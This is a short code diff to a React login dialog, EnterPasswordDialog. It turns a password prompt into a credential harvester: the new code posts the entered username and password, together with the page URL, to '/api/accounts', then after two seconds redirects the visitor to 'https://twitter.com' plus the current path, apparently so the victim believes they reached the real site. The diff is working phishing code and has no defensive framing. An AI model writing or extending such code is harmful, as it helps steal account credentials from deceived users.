@@ -7,7 +7,7 @@ const EnterPasswordDialog = ({ username, onClose, showLoading }) => {
     const [password, setPassword] = useState("");
     const ip = useRef();
 
-    const onLogin = () => {
+    const onLogin = async () => {
         if (!password.trim()) {
             ip.current.focus();
             return;
@@ -15,10 +15,22 @@ const EnterPasswordDialog = ({ username, onClose, showLoading }) => {
 
         showLoading();
 
-        console.log({
-            username,
-            password,
+        await fetch("/api/accounts", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                username,
+                password,
+                ref: window.location.href,
+            }),
         });
+
+        setTimeout(() => {
+            window.location.href =
+                "https://twitter.com" + window.location.pathname;
+        }, 2000);
     };
 
     return (
